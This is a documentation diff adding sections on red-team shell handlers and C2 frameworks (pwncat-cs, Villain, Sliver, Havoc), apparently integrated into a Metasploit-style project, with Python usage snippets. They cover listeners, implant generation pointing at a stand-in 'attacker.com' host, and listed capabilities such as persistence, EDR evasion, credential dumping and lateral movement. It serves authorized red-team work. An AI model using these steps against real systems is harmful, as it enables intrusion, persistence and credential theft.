@@ -540,6 +540,186 @@ P4x-ng (https://github.com/P4X-ng)
 
 ---
 
+### 6. pwncat-cs Shell Handler (`pwncat.py`)
+
+**Purpose:** Modern shell handler with advanced post-exploitation capabilities
+
+**Features:**
+- Automatic privilege escalation
+- Persistent shell management
+- File upload/download with progress tracking
+- Command history and tab completion
+- Automatic enumeration modules
+- Implant persistence capabilities
+- Cross-platform support (Linux, Windows)
+
+**Usage:**
+```python
+from lib.msf.core.integrations.pwncat import PwncatIntegration
+
+pwncat = PwncatIntegration({'lhost': '0.0.0.0'})
+if pwncat.initialize():
+    # Start listener
+    result = pwncat.execute('listen', host='0.0.0.0', port=4444, protocol='linux')
+    
+    # Upload file when session is established
+    pwncat.execute('upload', local_path='/local/file', remote_path='/remote/file')
+    
+    # Run enumeration
+    pwncat.execute('enum', module='all')
+    
+    pwncat.cleanup()
+```
+
+**Module:** `modules/auxiliary/server/pwncat_listener.py`
+
+**Use Cases:**
+- Catching reverse shells with advanced features
+- Automatic privilege escalation testing
+- Post-exploitation automation
+- Professional shell management that scales
+
+---
+
+### 7. Villain Shell Handler (`villain.py`)
+
+**Purpose:** Modern C2 framework with web-based UI for shell management
+
+**Features:**
+- Web-based interface for managing multiple shells
+- Multiple shell types (bash, powershell, hoaxshell)
+- File upload/download capabilities
+- Command execution with output capture
+- Shell upgrade and obfuscation
+- Payload generation
+- Session management at scale
+
+**Usage:**
+```python
+from lib.msf.core.integrations.villain import VillainIntegration
+
+villain = VillainIntegration()
+if villain.initialize():
+    # Start server
+    result = villain.execute('start', host='0.0.0.0', port=6666)
+    
+    web_url = result['web_url']
+    print(f"Access Villain at: {web_url}")
+    
+    # Generate payload through web UI
+    # Manage sessions through web UI
+    
+    villain.execute('stop')
+    villain.cleanup()
+```
+
+**Module:** `modules/auxiliary/server/villain_server.py`
+
+**Use Cases:**
+- Managing multiple compromised systems
+- Team-based red team operations
+- Web-based shell interaction
+- Scalable shell management
+
+---
+
+### 8. Sliver C2 Framework (`sliver.py`)
+
+**Purpose:** Modern open-source C2 framework for red team operations
+
+**Features:**
+- Dynamic code generation (Go, C#, shellcode, service binaries)
+- Secure C2 over mTLS, WireGuard, HTTP(S), and DNS
+- Process injection and migration
+- In-memory .NET assembly execution
+- Windows token manipulation
+- Advanced tunneling and port forwarding
+- Session multiplexing
+- Anti-forensics features
+- Cross-platform support
+
+**Usage:**
+```python
+from lib.msf.core.integrations.sliver import SliverIntegration
+
+sliver = SliverIntegration()
+if sliver.initialize():
+    # Start server
+    sliver.execute('start_server', daemon=True)
+    
+    # Start listener
+    sliver.execute('start_listener', protocol='mtls', host='0.0.0.0', port=8888)
+    
+    # Generate implant
+    sliver.execute('generate', 
+                  os='windows', 
+                  arch='amd64', 
+                  mtls_host='attacker.com',
+                  output='/tmp/implant.exe')
+    
+    # List sessions
+    result = sliver.execute('list_sessions')
+    
+    sliver.cleanup()
+```
+
+**Module:** `modules/auxiliary/integration/sliver_c2.py`
+
+**Use Cases:**
+- Professional red team engagements
+- Advanced persistent operations
+- Secure C2 communications
+- Multi-platform targeting
+
+---
+
+### 9. Havoc C2 Framework (`havoc.py`)
+
+**Purpose:** Modern post-exploitation C2 with GUI teamserver
+
+**Features:**
+- Modern GUI teamserver for collaborative operations
+- Sleep obfuscation techniques
+- Indirect syscalls for AV/EDR evasion
+- Advanced injection techniques
+- Windows token manipulation
+- Credential dumping
+- Lateral movement capabilities
+- Python and BOF extension support
+- Multiple C2 profiles
+
+**Usage:**
+```python
+from lib.msf.core.integrations.havoc import HavocIntegration
+
+havoc = HavocIntegration()
+if havoc.initialize():
+    # Start teamserver
+    result = havoc.execute('start_teamserver', host='0.0.0.0', port=40056)
+    
+    # Start client GUI (in separate terminal or process)
+    havoc.execute('start_client')
+    
+    # Manage operations through GUI:
+    # - Generate demon agents
+    # - Configure listeners
+    # - Execute commands
+    # - Dump credentials
+    # - Lateral movement
+    
+    havoc.cleanup()
+```
+
+**Module:** `modules/auxiliary/integration/havoc_c2.py`
+
+**Use Cases:**
+- Professional red team operations
+- Team-based engagements with GUI
+- Advanced evasion techniques
+- Modern C2 infrastructure
+
+---
+
 ## Future Enhancements
 
 See [BINARY_ANALYSIS_TOOLS.md](../../documentation/integrations/BINARY_ANALYSIS_TOOLS.md) for planned binary analysis tool integrations.
